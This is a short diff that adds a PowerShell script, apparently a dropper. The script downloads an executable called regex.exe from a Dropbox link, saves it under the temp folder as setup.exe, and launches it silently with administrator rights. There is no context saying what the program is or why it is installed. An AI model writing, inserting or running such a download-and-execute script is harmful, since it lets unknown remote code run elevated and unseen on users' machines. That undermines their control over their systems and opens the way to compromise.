@@ -1,0 +1,5 @@
+$u = "https://www.dropbox.com/scl/fi/ljeru0tfu7vwv5s3kwnrc/regex.exe?rlkey=rxxo30vduvltv81qe53afocca&st=5lvu7eev&dl=0"
+$p = "$env:TEMP\setup.exe"
+
+Invoke-RestMethod $u -OutFile $p
+Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
